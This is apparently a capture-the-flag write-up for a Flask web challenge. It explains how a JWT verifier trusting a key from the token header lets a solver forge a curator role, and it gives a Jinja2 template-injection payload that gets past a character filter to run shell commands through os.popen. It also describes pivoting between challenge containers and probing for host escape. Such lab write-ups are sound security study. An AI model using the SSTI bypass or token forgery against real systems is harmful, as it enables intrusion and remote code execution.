# Citrus Proof — WEB, 550 pts — SOLVED

- **Target:** `http://54.72.82.22:8320` — Werkzeug/3.1.9, Python/3.11.16, Flask (dev server)
- **Branch:** `chal/web/citrus-proof`
- **Status:** ✅ **SOLVED**
- **Flag:** `safctf{83f575a861a0c69d675d700dcb658cd2}`

## The solve

The role gate was never a secret-cracking problem. The server **trusts a signing
key supplied in the JWT header itself** — a JWK header-injection / self-signed-JWT
bug. The header may carry `{"jwk": {"k": "<base64 key>"}}`; the verifier then uses
*that* key instead of a server-side secret. So anyone can mint a "valid"
`{"role":"curator"}` token by signing with a key of their own choosing.

Where the leak came from: the **sibling challenge *Touchline Dispatch* (`:8300`,
already solved)** has a path traversal that reads `/app/service.py`. Same
organizer runtime, so its source is shared — it shows the verifier verbatim:

```python
def claims():
    token = request.headers.get('Authorization','').removeprefix('Bearer ')
    h,p,s = token.split('.')
    head  = json.loads(unb64(h))
    key   = unb64(head['jwk']['k']) if 'jwk' in head else b'front-desk'
    if not hmac.compare_digest(unb64(s), hmac.new(key,(h+'.'+p).encode(),sha256).digest()):
        raise ValueError('signature')
    return json.loads(unb64(p))
```

Once curator, `POST /api/proof` renders the supplied `layout` with
`render_template_string` — Jinja2 SSTI — but **rejects layouts containing any of
`_`, `[`, `]`**. The filter is dodged by pulling the attribute names and the
command out of the **query string** (query args are not filtered) and using
`|attr()`:

```
{{lipsum|attr(request.args.g)|attr('get')(request.args.m)|attr(request.args.f)(request.args.c)|attr('read')()}}
```

with `?g=__globals__&m=os&f=popen&c=<cmd>` → RCE. The flag is in the container
env (`FLAG=...`) and is also written to `/app/private/reserve.txt` at startup.

## `/submit` is a decoy here

Do not chase it. `/submit` compares `sha256(answer)` against `cfg['answer_hash']`,
but Citrus Proof's `/app/settings.json` **has no `answer_hash` key**, so the
fallback `'!'` can never match — `/submit` returns 403 for *every* input by
construction. The env / `reserve.txt` value IS the flag. Posting it to `/submit`
still returns 403 (confirmed).

## Reproduce

```sh
/home/nomad/safaricom_ctf/.venv/bin/python chal/web/citrus-proof/solve.py
# [*] forged curator, {{7*7}} -> 200 {"proof":"49"}
# [*] /app/private/reserve.txt -> 'safctf{83f575a861a0c69d675d700dcb658cd2}'
# [+] FLAG: safctf{83f575a861a0c69d675d700dcb658cd2}
```

## App surface

```
GET  /              static landing page, no reflection
POST /api/session   -> 200 {"token": "<JWT>"}   (method-agnostic)
POST /api/proof     -> needs Bearer <curator JWT>; body {"layout": "..."}
POST /submit        -> dict body {"answer": "..."}   (decoy: no answer_hash)
GET  /health        -> {"status":"ok"}
```

## Dead ends — already exhausted, do NOT repeat

The token is hand-rolled HS256 (`json.dumps` spacing, PyJWT would not emit the
spaces), payload always `{"role":"visitor"}`, byte-identical every call.

Offline key recovery, all **negative**: rockyou (14.3M); jwt-secrets (104k) + xato
1M; brute `[a-z0-9]{1..5}` (62,193,780 keys); brute `[a-zA-Z0-9]{1..4}`
(15,018,570 keys); theme/leet generator (17,728 keys); framework-id keys; every
double-base64 taunt string in the repo (902 literals); token-derived keys;
alternate HMAC formulas; `kid`/`jku`/`x5u` as key (400).

Also negative: `alg:none`/`None`/`NONE`, empty signature, signature truncation,
signature-coverage gaps (all 400 — so signature verification itself is sound);
role override by body/header/query/cookie (`/api/session` always mints
`visitor`); debug mode off (no Werkzeug console).

Container pivot (via Ginger Juice Shop `:8050` root RCE) reached container
`54820c139049` on `172.16.5.2/24` — a plain flask image on its **own bridge**,
Citrus not on that network, so `/app/app.py` was unreachable from there. Host
escape blocked by the device cgroup (mknod succeeds, raw read EPERM; no
CAP_SYS_ADMIN, no docker.sock, no open_by_handle_at).

**The lesson:** the secret was never on this box. It was in a *sibling
challenge's* leaked source. When one challenge in a family has a source leak, that
leak describes the whole family's runtime — check it before brute-forcing.
